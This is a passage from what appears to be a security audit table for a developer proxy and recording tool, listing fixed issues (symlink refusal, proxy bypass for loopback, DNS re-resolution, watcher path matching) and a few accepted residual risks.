| 9 | fixed | Recordings and HAR exports refuse symlinked or out-of-project folders; unredacted recordings are refused where git would track them (ignore rules read without spawning git). |
| 10 | fixed | Loopback and emulator-alias targets never go through the upstream proxy. |
| 11 | fixed | Plain-HTTP LAN traffic via an upstream proxy is sent to the already-checked IP (no second DNS resolution). |
| 12 | fixed | Body-file watchers match exact paths (no globs); auth analysis hashes only 401/403 routes; diff/load caches; MCP hints for `replay_recording` / `add_map_remote`; self-loop check normalised. |

Accepted residuals: the contents of an approved rule's `bodyFile` can change without re-approval (the file is in the repo, reviewable in diffs); a response `replaceBody` on a JavaScript response that inserts neither `<` nor `javascript:` is not gated; in multi-root workspaces body files resolve against the primary folder.
